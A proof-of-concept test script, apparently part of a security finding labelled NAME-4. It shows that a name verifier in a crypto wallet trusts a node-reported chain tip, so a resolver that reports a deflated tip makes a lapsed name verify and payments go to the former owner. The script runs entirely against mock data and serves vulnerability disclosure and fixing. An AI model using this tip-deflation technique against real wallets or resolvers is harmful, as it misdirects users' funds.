// NAME-4 PoC: tip-deflation defeats lease-lapse detection in the SPV name verifier.
// The wallet NEVER syncs headers past maxEventHeight+CONF_BUFFER (namespv.ts:364), so verifiedTip
// cannot itself detect that an OLD name's lease has lapsed. Lapse relies ENTIRELY on the UNTRUSTED
// node-reported tip. A hostile/MITM resolver that DEFLATES the tip makes a lapsed name verify:true
// and route funds to the (lapsed) prior owner. Run: tsx test/name4-lapse-poc.mjs
import { verifyName } from "../src/core/namespv.ts";
import { buildNameClaim, buildNameSet, TREASURY_ADDR } from "../src/core/cairnx.ts";
import { signSighash, buildScriptSig, addrFromPriv } from "../src/core/csdtx.ts";
import { txid as ctxid, sighash as vSighash, merkleRoot, rpcTxToTx } from "../src/vendor/cairnx-spv.js";

const CAIRNX_DOMAIN = "cairnx:v1";
const REG_FEE = 1000_000_000;
const keyA = "0x" + "11".repeat(32);
const A = addrFromPriv(keyA).toLowerCase();
const TARGET = "0x" + "cd".repeat(20);
let _seq = 0; const PREVOUTS = new Map();
const prevoutFor = (t) => PREVOUTS.get(String(t).toLowerCase()) ?? null;

function proposeTx({ uri, payloadHash, expiresEpoch = 9_999_999, priv, outputs = [] }) {
  const prevTxid = "0x" + (++_seq).toString(16).padStart(64, "0");
  PREVOUTS.set(prevTxid.toLowerCase(), String(addrFromPriv(priv)).toLowerCase());
  const tx = { version: 1, locktime: 0, inputs: [{ prevTxid, vout: 0, scriptSig: "0x" }],
    outputs: outputs.map((o) => ({ value: o.value, scriptPubkey: o.to })),
    app: { type: "Propose", domain: CAIRNX_DOMAIN, payloadHash, uri, expiresEpoch } };
  const { sig64, pub33 } = signSighash(vSighash(tx), priv);
  tx.inputs[0].scriptSig = buildScriptSig(sig64, pub33);
  return { version: 1, locktime: 0,
    inputs: [{ prev_txid: prevTxid, vout: 0, script_sig: tx.inputs[0].scriptSig }],
    outputs: outputs.map((o) => ({ value: o.value, script_pubkey: o.to })),
    app: { type: "Propose", domain: CAIRNX_DOMAIN, payload_hash: payloadHash, uri, expires_epoch: expiresEpoch } };
}
const pick = (b) => ({ uri: b.uri, payloadHash: b.payloadHash });
const NAME = "alice";
const claimTx = proposeTx({ ...pick(buildNameClaim({ name: NAME })), priv: keyA, outputs: [{ to: TREASURY_ADDR, value: REG_FEE }] });
const nsetTx = proposeTx({ ...pick(buildNameSet({ name: NAME, addr: TARGET })), priv: keyA });

const blocks = new Map([[33700, [claimTx]], [33710, [nsetTx]]]);
const hints = [{ txid: ctxid(rpcTxToTx(claimTx)), height: 33700, pos: 0 },
               { txid: ctxid(rpcTxToTx(nsetTx)),  height: 33710, pos: 0 }];

// verifiedTip is ALWAYS ~maxEventHeight+CONF_BUFFER in production (the wallet never syncs further) — so
// the only knob that detects lapse is nodeTip. We model the realistic verifiedTip and vary nodeTip.
function src(nodeTip) {
  return {
    async prepare() { return { verifiedTip: 33722, nodeTip }; }, // verifiedTip pinned near the records (real behaviour)
    async blockAt(h) { const txs = blocks.get(h); return { merkle: merkleRoot(txs.map((t) => ctxid(rpcTxToTx(t)))), txs }; },
    async prevoutScriptPubkey(t) { return prevoutFor(t); },
  };
}

// claim epoch = floor(33700/30)=1123; paidThrough=1123+8760=9883; lapses at ep>10603 => height>318090.
const REAL_TIP = 320000;   // honest chain tip — alice.csd lease lapsed LONG ago
const DEFLATED  = 33722;   // hostile/MITM tip == verifiedTip (cannot go below it; seenFloor=0 on MV3 cold start)

const honest = await verifyName(NAME, { addr: TARGET, owner: A, via: "nset" }, hints, src(REAL_TIP));
const attack = await verifyName(NAME, { addr: TARGET, owner: A, via: "nset" }, hints, src(DEFLATED));

console.log("HONEST tip (lapsed):  verified=%s reason=%s", honest.verified, honest.reason);
console.log("DEFLATED tip (MITM):  verified=%s addr=%s via=%s", attack.verified, attack.addr, attack.via);
console.log(attack.verified === true && attack.addr === TARGET && honest.verified === false
  ? "\nPoC CONFIRMED: tip-deflation flips a LAPSED name to verified:true -> funds route to prior (lapsed) owner"
  : "\nPoC did not reproduce");
